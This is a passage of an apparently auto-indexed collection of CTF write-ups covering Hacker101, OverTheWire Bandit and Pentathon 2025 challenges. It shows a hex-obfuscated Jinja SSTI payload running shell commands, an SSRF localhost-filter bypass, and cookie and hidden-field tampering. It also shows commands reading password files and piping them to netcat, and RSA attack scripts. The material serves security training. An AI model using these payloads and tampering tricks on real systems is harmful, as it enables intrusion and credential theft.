\"kind\": \"NON_NULL\",\n                  \"ofType\": {\n                    \"name\": \"ID\",\n                    \"kind\": \"SCALAR\"\n                  }\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"user\",\n            \"args\": [\n              {\n                \"name\": \"before\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"after\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"first\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"last\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"findUser\",\n            \"args\": [\n              {\n                \"name\": \"username\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"findBug\",\n            \"args\": [\n              {\n                \"name\": \"_\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"allUsers\",\n            \"args\": [\n              {\n                \"name\": \"before\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"after\",\n                \"type\": {\n                  \"name\": \"String\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"first\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              },\n              {\n                \"name\": \"last\",\n                \"type\": {\n                  \"name\": \"Int\",\n                  \"kind\": \"SCALAR\",\n                  \"ofType\": null\n                }\n              }\n            ]\n          },\n          {\n            \"name\": \"allBugs\",\n            \"args\": []\n          }\n        ]\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v2/#enumerate-the-mutations","title":"Enumerate the Mutations","text":"<pre><code>{\n  __type(name: \"MyMutations\") {\n    fields {\n      name\n      args {\n        name\n        description\n        type {\n          name\n          kind\n          ofType {\n            name\n            kind\n          }\n        }\n      }\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"__type\": {\n      \"fields\": [\n        {\n          \"name\": \"modifyBug\",\n          \"args\": [\n            {\n              \"name\": \"id\",\n              \"description\": null,\n              \"type\": {\n                \"name\": \"Int\",\n                \"kind\": \"SCALAR\",\n                \"ofType\": null\n              }\n            },\n            {\n              \"name\": \"private\",\n              \"description\": null,\n              \"type\": {\n                \"name\": \"Boolean\",\n                \"kind\": \"SCALAR\",\n                \"ofType\": null\n              }\n            },\n            {\n              \"name\": \"text\",\n              \"description\": null,\n              \"type\": {\n                \"name\": \"String\",\n                \"kind\": \"SCALAR\",\n                \"ofType\": null\n              }\n            }\n          ]\n        }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/BugDB%20v2/#what-to-do","title":"What to do","text":"<p>Trying to list bugs using <code>allBugs()</code>:</p> <pre><code>query {\n  allBugs {\n    id\n    text\n    private\n    reporter {\n      id\n    }\n    reporterId\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"allBugs\": [\n      {\n        \"id\": \"QnVnczox\",\n        \"text\": \"This is an example bug\",\n        \"private\": false,\n        \"reporter\": {\n          \"id\": \"VXNlcnM6MQ==\"\n        },\n        \"reporterId\": 1\n      }\n    ]\n  }\n}\n</code></pre> <p>Use the mutation <code>modifyBug()</code> to modify the privacy of Bug with id 2:</p> <pre><code>mutation {\n  modifyBug(id: 2, private: false) {\n    ok\n    bug {\n      id\n      text\n      reporterId\n    }\n  }\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"modifyBug\": {\n      \"ok\": true,\n      \"bug\": null\n    }\n  }\n}\n</code></pre> <p>Query <code>allBugs()</code> again:</p> <pre><code>{\n  \"data\": {\n    \"allBugs\": [\n      {\n        \"id\": \"QnVnczox\",\n        \"text\": \"This is an example bug\",\n        \"private\": false,\n        \"reporter\": {\n          \"id\": \"VXNlcnM6MQ==\"\n        },\n        \"reporterId\": 1\n      },\n      {\n        \"id\": \"QnVnczoy\",\n        \"text\": \"^FLAG^0b6a2cde031b3bffd4d3181237e7a8aaa5e54bddd1eed1118834ecd6d879520e$FLAG$\",\n        \"private\": false,\n        \"reporter\": {\n          \"id\": \"VXNlcnM6Mg==\"\n        },\n        \"reporterId\": 2\n      }\n    ]\n  }\n}\n</code></pre>"},{"location":"Hacker101-CTF/Micro-CMS%20v1/","title":"Micro-CMS v1","text":"<p>Exploring the site gives us few observations:</p> <ul> <li>It's a markdown page editing site.</li> <li>New page can be created at <code>/page/create</code></li> <li>Pages can be viewed at <code>/page/&lt;page-num&gt;</code> and edited at <code>/page/edit/&lt;page-num&gt;</code></li> </ul>"},{"location":"Hacker101-CTF/Micro-CMS%20v1/#flag-0","title":"Flag 0","text":"<p>Testing is page-1 and Markdown Test is page 2. On creating new pages, the page numbers assigned are 11, 12,... \\ This seems weird. Viewing all pages from 3 to 10, all give Page Not Found, except for the 5th page which says Forbidden -- read-protected. \\ Hmm..it's read-protected, is it write-protected? Go to <code>/page/edit/5</code> and there's the flag.</p>"},{"location":"Hacker101-CTF/Micro-CMS%20v1/#flag-1","title":"Flag 1","text":""},{"location":"Hacker101-CTF/Micro-CMS%20v1/#flag-2","title":"Flag 2","text":""},{"location":"Hacker101-CTF/Micro-CMS%20v1/#flag-3","title":"Flag 3","text":""},{"location":"Hacker101-CTF/Postbook/","title":"Postbook","text":"<p>After signing up, exploring the site gives us few observations:</p> <ul> <li>User's profile is at <code>?page=profile.php&amp;id=&lt;user-id&gt;</code></li> <li>New page can be created at <code>/page/create</code></li> <li>Posts can be viewed at <code>?page=view.php&amp;id=&lt;post-id&gt;</code>, edited at <code>?page=edit.php&amp;id=&lt;post-id&gt;</code> and deleted by <code>?page=delete.php&amp;id=&lt;md5-hashed-post-id&gt;</code></li> </ul>"},{"location":"Hacker101-CTF/Postbook/#flag-0","title":"Flag 0","text":""},{"location":"Hacker101-CTF/Postbook/#flag-1","title":"Flag 1","text":"<p>We can see two public posts in homepage with id=1 &amp; id=3, and a new created post has id=4. \\ Edit the URL to view the post at id=2.</p>"},{"location":"Hacker101-CTF/Postbook/#flag-2","title":"Flag 2","text":"<p>Post creation page doesn't take any URL params. How does it know which user is posting? \\ On inspecting the form...</p> <pre><code>&lt;input type=\"hidden\" name=\"user_id\" value=\"3\"&gt;\n</code></pre> <p>Change the <code>value</code> to \"1\"; and create post.</p>"},{"location":"Hacker101-CTF/Postbook/#flag-3","title":"Flag 3","text":""},{"location":"Hacker101-CTF/Postbook/#flag-4","title":"Flag 4","text":"<p>On saving an edited post, the page shown has <code>message=</code> in the URL. Text against this is displayed on the page with yellow highlight. Hmmmm. \\ Go to the edit page of post id 1,2 or 3; and save.</p>"},{"location":"Hacker101-CTF/Postbook/#flag-5","title":"Flag 5","text":"<p>Postbook homepage must be using some browser storage to identify user (for private/public status of posts), as user id is not passed in the URL. \\ Indeed, cookie stores a MD5 hash. Reversing the hash (using online tools) for 3rd user (user created by us) gives \"3\". \\ Hash \"1\" and edit the value of cookie. Refresh/Open the homepage.</p>"},{"location":"Hacker101-CTF/Postbook/#flag-6","title":"Flag 6","text":"<p>Delete post of id 1,2 or 3 by md5 hashing and visiting the URL mentioned above.</p>"},{"location":"OverTheWire/Bandit/","title":"Bandit","text":""},{"location":"OverTheWire/Bandit/#level-0","title":"level 0","text":"<pre><code>ssh bandit0@bandit.labs.overthewire.org -p 2220\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-0-level-1","title":"level 0 -&gt; level 1","text":"<pre><code>cat readme\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-1-level-2","title":"level 1 -&gt; level 2","text":"<p>Dashed file names</p> <pre><code>cat &lt; -\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-2-level-3","title":"level 2 -&gt; level 3","text":"<pre><code>cat &lt; \"--spaces in this filename--\"\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-3-level-4","title":"level 3 -&gt; level 4","text":"<pre><code>ls -a\ncd inhere/\nls -a\ncat ...Hiding-From-You\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-4-level-5","title":"level 4 -&gt; level 5","text":"<pre><code>cd inhere/\nfind . -type f -exec file --mime {} + | grep 'text/'\n&gt; ./-file07: text/plain; charset=us-ascii\n  ./-file00: text/plain; charset=unknown-8bit\ncat &lt; -file07\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-5-level-6","title":"level 5 -&gt; level 6","text":"<pre><code>human-readable\n1033 bytes in size\nnot executable\n</code></pre> <pre><code>find inhere/ -type f -size 1033c ! -executable -exec file --mime {} + | grep 'text/'\n&gt; inhere/maybehere07/.file2: text/plain; charset=us-ascii\ncat inhere/maybehere07/.file2\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-6-level-7","title":"level 6 -&gt; level 7","text":"<pre><code>owned by user bandit7\nowned by group bandit6\n33 bytes in size\n</code></pre> <pre><code>find / -type f -size 33c -user bandit7 -group bandit6\ncat /var/lib/dpkg/info/bandit7.password\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-7-level-8","title":"level 7 -&gt; level 8","text":"<pre><code>grep \"millionth\" data.txt\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-8-level-9","title":"level 8 -&gt; level 9","text":"<pre><code>sort data.txt | uniq -c | sort -n | head \n</code></pre>"},{"location":"OverTheWire/Bandit/#level-9-level-10","title":"level 9 -&gt; level 10","text":"<pre><code>strings data.txt | grep \"===\"\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-10-level-11","title":"level 10 -&gt; level 11","text":"<pre><code>base64 -d data.txt\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-11-level-12","title":"level 11 -&gt; level 12","text":"<pre><code>cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-12-level-13","title":"level 12 -&gt; level 13","text":"<pre><code>xxd -r data.txt &gt; data\nfile data\n&gt; data: gzip compressed data, was \"data2.bin\", last modified: Fri Aug 15 13:15:53 2025, max compression, from Unix, original size modulo 2^32 584\nmv data data.gz\ngzip -d data.gz\nfile data\n&gt; data: bzip2 compressed data, block size = 900k\nmv data data.bz2\nbzip2 -d data.bz2\nfile data\n&gt; data: gzip compressed data, was \"data4.bin\", last modified: Fri Aug 15 13:15:53 2025, max compression, from Unix, original size modulo 2^32 20480\nmv data data.gz\ngzip -d data.gz\nfile data\n&gt; data: POSIX tar archive (GNU)\nmv data data.tar\ntar -xvf data.tar\n&gt; data5.bin\nfile data5.bin\n&gt; data5.bin: POSIX tar archive (GNU)\ntar -xvf data5.bin\n&gt; data6.bin\nfile data6.bin\n&gt; data6.bin: bzip2 compressed data, block size = 900k\nbzip2 -d data6.bin\n&gt; bzip2: Can't guess original name for data6.bin using data6.bin.out\nfile data6.bin.out\n&gt; data6.bin.out: POSIX tar archive (GNU)\ntar -xvf data6.bin.out\n&gt; data8.bin\nfile data8.bin\n&gt; data8.bin: gzip compressed data, was \"data9.bin\", last modified: Fri Aug 15 13:15:53 2025, max compression, from Unix, original size modulo 2^32 49\nmv data8.bin data8.bin.gz\ngzip -d data8.gz\nfile data8\n&gt; data8: ASCII text\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-13-level-14","title":"level 13 -&gt; level 14","text":"<pre><code>cat sshkey.private\n</code></pre> <p>Password is not accessible, we got a private sshkey for next level</p> <pre><code>ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-14-level-15","title":"level 14 -&gt; level 15","text":"<pre><code>cat /etc/bandit_pass/bandit14 | nc localhost 30000\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-15-level-16","title":"level 15 -&gt; level 16","text":"<pre><code>cat /etc/bandit_pass/bandit15 | ncat --ssl localhost 30001\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-16-level-17","title":"level 16 -&gt; level 17","text":"<pre><code>nmap -p 31000-32000 --script ssl-enum-ciphers localhost\n</code></pre> <p>Possible ports: 31518, 31790</p> <pre><code>cat /etc/bandit_pass/bandit16 | ncat --ssl localhost 31518\ncat /etc/bandit_pass/bandit16 | ncat --ssl localhost 31790\n</code></pre> <p>Port 31790 gives a private ssh key</p>"},{"location":"OverTheWire/Bandit/#level-17-level-18","title":"level 17 -&gt; level 18","text":"<pre><code>diff passwords.old passwords.new \n</code></pre>"},{"location":"OverTheWire/Bandit/#level-18-level-19","title":"level 18 -&gt; level 19","text":"<pre><code>ssh bandit18@bandit.labs.overthewire.org -p 2220 \"cat readme\"\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-19-level-20","title":"level 19 -&gt; level 20","text":"<pre><code>./bandit20-do cat /etc/bandit_pass/bandit20\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-20-level-21","title":"level 20 -&gt; level 21","text":"<pre><code>cat /etc/bandit_pass/bandit20 | nc -l -p 12345\n</code></pre> <pre><code>./suconnect 12345\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-21-level-22","title":"level 21 -&gt; level 22","text":"<pre><code>bandit21@bandit:~$ cd /etc/cron.d/\n\nbandit21@bandit:/etc/cron.d$ ls\nbehemoth4_cleanup  cronjob_bandit23  leviathan5_cleanup    sysstat\nclean_tmp          cronjob_bandit24  manpage3_resetpw_job\ncronjob_bandit22   e2scrub_all       otw-tmp-dir\n\nbandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 \n@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null\n* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null\n\nbandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh\n#!/bin/bash\nchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\ncat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n\nbandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-22-level-23","title":"level 22 -&gt; level 23","text":"<pre><code>bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 \n@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null\n* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null\n\nbandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh\n#!/bin/bash\nmyname=$(whoami)\nmytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)\necho \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\"\ncat /etc/bandit_pass/$myname &gt; /tmp/$mytarget\n\nbandit22@bandit:~$ whoami\nbandit22\n\nbandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1\n8ca319486bfbbc3663ea0fbe81326349\n\nbandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349\n</code></pre>"},{"location":"OverTheWire/Bandit/#level-23-level-24","title":"level 23 -&gt; level 24","text":"<pre><code>bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24 \n@reboot bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &amp;&gt; /dev/null\n</code></pre> <pre><code>bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh\n#!/bin/bash\n\nmyname=$(whoami)\n\ncd /var/spool/$myname/foo\necho \"Executing and deleting all scripts in /var/spool/$myname/foo:\"\nfor i in * .*;\ndo\n    if [ \"$i\" != \".\" -a \"$i\" != \"..\" ];\n    then\n        echo \"Handling $i\"\n        owner=\"$(stat --format \"%U\" ./$i)\"\n        if [ \"${owner}\" = \"bandit23\" ]; then\n            timeout -s 9 60 ./$i\n        fi\n        rm -f ./$i\n    fi\ndone\n</code></pre> <pre><code>bandit23@bandit:~$ mktemp -d\n/tmp/tmp.OAoC8cNtjQ\n\nbandit23@bandit:~$ cd /tmp/tmp.OAoC8cNtjQ\n\nbandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ touch pass.txt\n\nbandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ vi script.sh\n\nbandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ cat script.sh \n#!/bin/bash\ncat /etc/bandit_pass/bandit24 &gt; /tmp/tmp.OAoC8cNtjQ/pass.txt\n\nbandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ chmod 777 -R /tmp/tmp.OAoC8cNtjQ\n\nbandit23@bandit:/tmp/tmp.OAoC8cNtjQ$ cp script.sh /var/spool/bandit24/foo/\n</code></pre> <p>After a minute or so, password will be written into <code>pass.txt</code></p>"},{"location":"OverTheWire/Bandit/#level-24-level-25","title":"level 24 -&gt; level 25","text":"<pre><code>#!/bin/bash\nset -e\n\nPASS=$(cat /etc/bandit_pass/bandit24)\n\n{\n    for PIN in $(seq -w 0000 9999); do\n        echo \"$PASS $PIN\"\n    done\n} | nc localhost 30002\n</code></pre>"},{"location":"Pentathon25/","title":"NCIIPC-AICTE Pentathon 2025","text":"<p>Credits:</p> <ul> <li>@Majestic9169</li> <li>@DarkGuy10</li> <li>@VaibhavR05</li> </ul>"},{"location":"Pentathon25/Beyond%20Borders/","title":"Beyond Borders","text":"<p>Web - Medium</p> <p>Description: Explore the travel blog and create your perfect travel plan. Feel free to share yours if you've got one!</p> <p></p> <p></p> <p>The name is being printed back, this can be a hint to injection</p> <p>payload <code>{{7*'7'}}</code> gives <code>7777777</code> -&gt; SSTI with Jinja template \\ several tries of payload indicated that the input is heavily sanitized</p> <p>VERY Helpful blog and a similar problem in PicoCTF 2025</p> <p>This payload worked:</p> <pre><code>{{request|attr('\\x61\\x70\\x70\\x6c\\x69\\x63\\x61\\x74\\x69\\x6f\\x6e')|attr('\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f')|attr('\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f')('\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f')|attr('\\x5f\\x5f\\x67\\x65\\x74\\x69\\x74\\x65\\x6d\\x5f\\x5f')('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f')('os')|attr('\\x70\\x6f\\x70\\x65\\x6e')('cat flag.txt')|attr('read')()}}\n</code></pre> <p>which translates to:</p> <pre><code>{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}\n</code></pre>"},{"location":"Pentathon25/DES-Key-Quest/","title":"DES-Key-Quest","text":"<p>Crypto - Easy</p> <p>Description: Welcome to the world of block ciphers! Your mission is to uncover the secret key used in this challenge.</p> <p>A text file given:</p> <pre><code>DES-ECB:e1d5e1fcaae4aba0b735c8fb2ae8797728b073a34b14c57be236c819e6d5f4bbd94f5748ff9d1e008fcad8d403e23d02845a51513bb1e65027ed1bebdcb70973d411a0503cf06c261cb04e1ce1c12925\n</code></pre> <p>We only have the ciphertext and the encryption method; description asks to \"uncover the secret key\"; this hints towards a weak-key DES problem</p> <p>The key <code>0xFFFFFFFFFFFFFFFF</code> worked!</p> <pre><code>Hey you guessed the key right!! Heres the flag: flag{Y3MnH9qgcsTWY3MnH9qgcsTWw}\n</code></pre>"},{"location":"Pentathon25/Last%20Transmission/","title":"Last Transmission","text":"<p>Forensics - Easy</p> <p>Description: Late one evening, network logs recorded a brief but unusual exchange. A terse message, filled with urgency and hints of a one-time secret transfer, appeared alongside an otherwise ordinary packet. The dialogue was short, leaving more questions than answers. What was really sent that night? The clues are subtle\u2014if you know where to look.</p> <p></p> <p>Extract the messages from the UDP stream:</p> <pre><code>tshark -r chall.pcap -Y \"ip.dst == 192.168.1.200 and udp\" -T fields -e udp.payload | xxd -r -p\n&gt; Hey, you ready for the transfer? This could be the game-changer.Always ready. Just say the word.This is high-stakes. I'm sending it once, and once \nonly. Don't screw this up.The area is crawling with eyes. It's gonna be tight.Our paths might cross again, but it'll be on our terms.This ends tonight, \none way or another.Here\u2019s the key, encrypted and waiting: Ujl0IUptNExhQEJxWGUyUG8jV2MlVXlOczdEa0h2WmY=And don\u2019t forget this\u2014keep it close: \nTGtKaEdmRHNBelhjVmJObQ==You know the drill. Good luck. You\u2019ll need it.\n</code></pre> <p>These may be parameters for AES:</p> <pre><code>Key: Ujl0IUptNExhQEJxWGUyUG8jV2MlVXlOczdEa0h2WmY=\nIV: TGtKaEdmRHNBelhjVmJObQ==\n</code></pre> <p>But what to decrypt? There are a lot of ICMP packets. Reference writeup \\ Extract the data bytes from the ICMP packets:</p> <pre><code>tshark -Y \"ip.dst == 192.168.1.200 &amp;&amp; icmp.type==8\" -T fields -e data.data -r chall.pcap | awk '{printf \"%s\", $1}'\n</code></pre> <p>Using Cyberchef, AES Decrypt these bytes using the Key and IV found above \\ The raw output has a PNG header; render the image, which showed the flag!</p> <p></p>"},{"location":"Pentathon25/Master%20of%20Minuscule/","title":"Master of Minuscule","text":"<p>Crypto - Easy</p> <p>Description: I am the master of the little mysteries! Your task is to unlock the flag by delving into the world of numbers</p> <p>Given: n, e, ct</p> <p>e is small</p> <pre><code>from Crypto.Util.number import long_to_bytes\n\nn = 16762077095801589672314890427869401187164086916344025478190347015681606276350033764791052494634438743687378102302129876469874629401611476115475741216444937553471054356393134540670817836743767583241290027522501016180585699330112702613161730012176085574743462096939111910613507008960837373716627558251940473661478520417826486527958422713970123527171162093407894286630360257132145754982872704536638681505413861494861497793838069021603881655804866695522655064013867284791862099373846594743596668718076555604173830911320344662327626095423734160003409379162445204425515220005854125716129645038092738757407899378631925818639\ne = 3  # small public exponent\nc = 710289350683868503644597519669917810036866060097512736293170169932115475815119142207293435658975273721020114420910211496808786789\n\n# c = m^3 mod n\n# highly probable that m^3 &lt; n, m = c^(1/3)\n\ndef int_cbrt(x):\n    lo, hi = 0, x\n    while lo &lt; hi:\n        mid = (lo + hi) // 2\n        if mid**3 &lt; x:\n            lo = mid + 1\n        else:\n            hi = mid\n    return lo\n\nm = int_cbrt(c)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"Pentathon25/Mini-RSA/","title":"Mini-RSA","text":"<p>Crypto - Easy</p> <p>Description: Decrypting RSA just got a bit more interesting! Don\u2019t forget, you can always simplify 'e'!</p> <p>Given: p, q, e, c</p> <p>Directly trying to decrypt using these values results in an error:</p> <pre><code>from Crypto.Util.number import inverse\nfrom Crypto.Util.number import long_to_bytes\n\np = 13013195056445077675245767987987229724588379930923318266833492046660374216223334270611792324721132438307229159984813414250922197169316235737830919431103659\nq = 12930920340230371085700418586571062330546634389230084495106445639925420450591673769061692508272948388121114376587634872733055494744188467315949429674451947\ne = 100\nc = 110886661313947816173908115981658339620571560526918289660960169252288610286791854093943168159755480182507940709690550773331393090271095840939446837160952597445303632714973330299193541279697398541542792961783509392552656152310579707871010170438249002720983123078577661000629914516027258039187727198233299377218\n\nn = p * q\nphi = (p - 1) * (q - 1)\nd = inverse(e, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))\n</code></pre> <p>ValueError: base is not invertible for the given modulus</p> <p>This is probably because <code>e</code> isn't prime and isn't coprime with <code>phi</code></p> <p>Implement the algo in this blog:</p> <pre><code>from Crypto.Util.number import inverse, GCD\nfrom Crypto.Util.number import long_to_bytes\n\np = 13013195056445077675245767987987229724588379930923318266833492046660374216223334270611792324721132438307229159984813414250922197169316235737830919431103659\nq = 12930920340230371085700418586571062330546634389230084495106445639925420450591673769061692508272948388121114376587634872733055494744188467315949429674451947\ne = 100\nc = 110886661313947816173908115981658339620571560526918289660960169252288610286791854093943168159755480182507940709690550773331393090271095840939446837160952597445303632714973330299193541279697398541542792961783509392552656152310579707871010170438249002720983123078577661000629914516027258039187727198233299377218\n\nn = p * q\nphi = (p - 1) * (q - 1)\nmax = 100\n\nk = 1\nwhile GCD(e, phi//k) != 1:\n    k = k * GCD(e, phi//k)\n\nd = inverse(e, phi//k)\ng = pow(c, d, n)\nfor a in range(1, max):\n    r = pow(a, phi//k, n)\n    m = (r * g) % n\n    print(long_to_bytes(m))\n</code></pre> <p>This prints possible plaintexts, including the flag</p>"},{"location":"Pentathon25/Prefixed/","title":"Prefixed","text":"<p>Crypto - Easy</p> <p>Description: A secured message was intercepted during an ongoing surveillance op. Can you extract the password?</p> <pre><code>from Crypto.Util.number import getPrime, bytes_to_long\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Cipher import AES\nfrom FLAG import flag\nimport os\n\ne = 3\np = getPrime(512)\nq = getPrime(512)\nN = p * q\n\npassword = os.urandom(8)\n\nprefix = b\"Hey! Hope you're having a great day :) Here's the super secret password: \"+password\n\nm = prefix\n\nm_int = bytes_to_long(m)\n\nc = pow(m_int, e, N)\n\ncipher = AES.new(pad(password,16), AES.MODE_ECB)\nenc_flag = cipher.encrypt(pad(flag,16))\n\nwith open(\"output.txt\",\"w\") as file:\n    file.write(f\"N = {N}\")\n    file.write(f\"\\ne = {e}\")\n    file.write(f\"\\nc = {c}\")\n    file.write(f\"\\nenc_flag = '{enc_flag.hex()}'\")\n</code></pre> <p>e=3, but the previous approach doesn't work here as m**3 &gt; n</p> <p>We have a small public exponent, and a ciphertext with a known prefix and random padding of 8 bytes -&gt; Coppersmith's Short-Pad Attack</p> <p>SageMath script:</p> <pre><code>from Crypto.Util.number import bytes_to_long, long_to_bytes\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad, pad\nfrom sage.all import *\n\nN = 113528691533286135619486503678320426942405436180474026715996758683677273620129519001116625212172928404143292206747424792047626885904598039830205811087655674076216144385016876388583905072205758846659333410528359659982670712013937085712468715762412604882698926617336331191121959509580646315781717517765241646819\ne = 3\nc = 40904880594701466859625372156952907024430068347250260526789660288294080258335285636904107784524813673301828193071221087338467468677414521714440705760297402168021146846811193689952807596695023202233937346637481974945815018994581831095979752874809661624444485774095865972611500010651804775720777433470611240847\nenc_flag = 'e0929dd13f9e646894ad757b0c3485d52f2fe369adfb1fa79e249effb630fd507ec4daa88611dfbac86db2d468cbf118'\n\nprefix = b\"Hey! Hope you're having a great day :) Here's the super secret password: \"\nm0 = bytes_to_long(prefix) &lt;&lt; 64\n\nPR.&lt;x&gt; = PolynomialRing(Zmod(N))\nf = (m0 + x)^e - c\nroot = f.small_roots(X=2^64, beta=1)[0]\n\npassword = long_to_bytes(int(root))\ncipher = AES.new(pad(password, 16), AES.MODE_ECB)\nflag = unpad(cipher.decrypt(bytes.fromhex(enc_flag)), 16)\nprint(flag)\n</code></pre>"},{"location":"Pentathon25/Ultra-Safe-Integers/","title":"Ultra-Safe-Integers","text":"<p>Pwn - Easy</p> <p>Description: Surely, overflows are just a string problem, aren\u2019t they?</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;time.h&gt;\n\n//gcc -m32 -fno-stack-protector -no-pie chall.c -o chall\n\nvoid init()\n{\n    setvbuf(stdin,NULL,_IONBF,0);\n    setvbuf(stdout,NULL,_IONBF,0);\n    setvbuf(stderr,NULL,_IONBF,0);\n    alarm(60);\n}\n\nvoid win()\n{\n    system(\"/bin/sh\");\n}\n\nint main()\n{\n    init();\n    srand(time(0));\n    int a = rand();\n    int input;\n    printf(\"Can you overflow me? The target number is %d\\n\",a);\n    scanf(\"%d\", &amp;input);\n    if(input &lt; 0)\n    {\n        puts(\"Nice try! If it was that easy even I could have cracked it!\");\n        exit(0);\n    }\n    int value = a + input;\n    if(value &lt; a)\n    {\n        puts(\"Wow, you beat me, here's your shell!\");\n        win();\n    }\n    else\n    {\n        puts(\"Well, that didn't work. Try again!\");\n    }\n    return 0;\n}\n</code></pre> <p>This is clearly an integer overflow problem</p> <p></p>"},{"location":"Pentathon25/Unblocker/","title":"Unblocker","text":"<p>Web - Easy</p> <p>Description: Need to access a blocked website? Use our unblocker to access it!</p> <p></p> <p>Clicking on Access Restricted Content takes us to <code>http://unblck3r.eng.run/flag</code> endpoint, which is Forbidden \\ Passing the same in unblocker gives <code>Error: Received status code 403</code></p> <p>Further inspection tells that on clicking on \"Unblock\", a GET request is made at <code>/proxy?url=&lt;input_url&gt;</code> by the iframe</p> <p></p> <p></p> <p>Trying different enumerations of localhost:</p> <ul> <li><code>http://localhost/flag</code> -&gt; Blocked unsafe URL</li> <li><code>http://127.0.0.1/flag</code> -&gt; Blocked unsafe URL</li> <li><code>http://[::1]/flag</code> -&gt; Blocked unsafe URL</li> <li><code>http://2130706433/flag</code> -&gt; flag{cd3d0356d34630b7b97f972b23a5ee38}</li> </ul>"},{"location":"QnQSec%20CTF%202025/Hardware/Not%20your%20Karnaugh%20diagram/","title":"Not your Karnaugh diagram","text":""},{"location":"QnQSec%20CTF%202025/Hardware/Not%20your%20Karnaugh%20diagram/#files-provided","title":"Files Provided","text":"<p>A pdf</p>"},{"location":"QnQSec%20CTF%202025/Hardware/Not%20your%20Karnaugh%20diagram/#approach","title":"Approach","text":"<p>Solve the K-map given in the pdf</p> <pre><code>QnQSec{0110 0110 0001 